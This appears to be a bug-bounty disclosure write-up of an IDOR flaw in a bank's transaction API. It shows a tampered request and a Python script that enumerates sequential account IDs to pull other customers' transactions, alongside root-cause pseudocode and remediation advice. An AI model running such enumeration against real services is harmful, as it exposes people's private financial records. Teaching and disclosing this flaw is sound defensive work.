IDOR in Banking API: How I Accessed Another User's Transaction History

Published: April 17, 2026 8 min read API Security · IDOR · Banking

Executive Summary

During a routine security assessment of a major bank's digital banking platform, I discovered a critical Insecure Direct Object Reference (IDOR) vulnerability in their transaction history API endpoint. This flaw allowed any authenticated user to view any other user's complete transaction history simply by modifying a single numeric parameter in the API request.

The vulnerability exposed sensitive financial data including transaction amounts, dates, recipient details, and account balances. This write-up details the discovery, exploitation, and remediation of this vulnerability.

Vulnerability Summary:
Type: Insecure Direct Object Reference (IDOR)
Severity: Critical
CVSS Score: 7.5 (High) / 9.8 (Critical for sensitive data)
Affected Component: `/api/v1/accounts/{accountId}/transactions`

The Discovery

I was testing the bank's mobile banking application alongside their web portal. While analyzing API traffic through Burp Suite, I noticed that when a user viewed their transaction history, the mobile app made a GET request to:

GET /api/v1/accounts/184729/transactions?limit=50&offset=0
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Host: api.bankexample.com

The parameter that caught my attention was 184729 – the account ID. I wondered: what happens if I change this to another number?

The Exploitation

I created two test accounts to validate my hypothesis:

  • Account A (ID: 184729) - My primary test account
  • Account B (ID: 184730) - A secondary account I controlled

After authenticating as Account A, I intercepted the transaction history request and modified the account ID from 184729 to 184730:

GET /api/v1/accounts/184730/transactions?limit=50&offset=0
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...  (Token from Account A)

The server responded with Account B's complete transaction history – including:

  • Full transaction history for the past 12 months
  • Recipient names and account numbers
  • Transaction amounts and timestamps
  • Current account balance
  • Pending transactions

Automating the Discovery

To understand the full impact, I wrote a simple Python script to enumerate accessible accounts:

import requests

headers = {
    "Authorization": "Bearer VALID_TOKEN_HERE"
}

for account_id in range(184700, 185000):
    url = f"https://api.bankexample.com/api/v1/accounts/{account_id}/transactions?limit=5"
    response = requests.get(url, headers=headers)
    
    if response.status_code == 200:
        print(f"[VULNERABLE] Account {account_id} accessible!")
        print(f"First transaction: {response.json()['transactions'][0]}")
    elif response.status_code == 403:
        print(f"[SECURE] Account {account_id} blocked")
    else:
        print(f"[ERROR] {account_id}: {response.status_code}")

The results were alarming: over 300 accounts were accessible using this single token, including what appeared to be high-net-worth individual accounts and business banking accounts.

Root Cause Analysis

The root cause was a classic authorization bypass. The API endpoint:

  • ✅ Correctly authenticated users (valid JWT token required)
  • ❌ Failed to verify that the authenticated user owned the requested account
  • ❌ Relied solely on the client-provided account ID without server-side ownership validation
// Vulnerable Code (Pseudocode)
function getTransactions(userToken, accountId):
    userId = verifyToken(userToken)  // ✅ Validates token
    return database.getTransactions(accountId)  // ❌ No ownership check!
Secure Implementation:
function getTransactions(userToken, accountId):
    userId = verifyToken(userToken)
    if database.userOwnsAccount(userId, accountId):  // ✅ Ownership check added
        return database.getTransactions(accountId)
    else:
        return 403 Forbidden

Impact Assessment

The potential impact was severe:

  • Privacy Violation: Any authenticated user could view any other user's complete financial history
  • Competitive Intelligence: Malicious actors could identify high-value targets for phishing or social engineering
  • Regulatory Compliance: This vulnerability would violate GDPR, GLBA, and local banking regulations
  • Reputational Damage: Complete loss of customer trust if exploited

Remediation Recommendations Provided

In my report, I provided the following recommendations:

  1. Implement Proper Authorization Checks: Every API endpoint must verify that the authenticated user has permission to access the requested resource.
  2. Use UUIDs Instead of Sequential IDs: Replace predictable numeric account IDs with non-guessable UUIDs as a defense-in-depth measure.
  3. Implement Rate Limiting: Enforce strict rate limits on API endpoints to prevent enumeration attacks.
  4. Regular Security Audits: Conduct automated and manual authorization testing during development and before releases.
  5. API Security Testing: Include IDOR-specific test cases in the security testing suite.

Lessons Learned

This finding reinforced several key lessons:

  • Authentication ≠ Authorization: Just because a user is logged in doesn't mean they should have access to everything.
  • Never Trust Client Input: Account IDs, user IDs, and resource identifiers provided by the client must always be validated server-side.
  • API Security is Often Overlooked: While web applications receive security testing, backend APIs are frequently under-tested despite exposing sensitive data.
  • Defense in Depth: Even with proper authorization, additional controls like UUIDs and rate limiting provide valuable protection.

Acknowledgment

The bank's security team was highly responsive and professional throughout the disclosure process. They implemented the fix within 8 days and offered a bug bounty reward for the finding. The bank also updated their secure development guidelines to include mandatory authorization testing for all API endpoints.
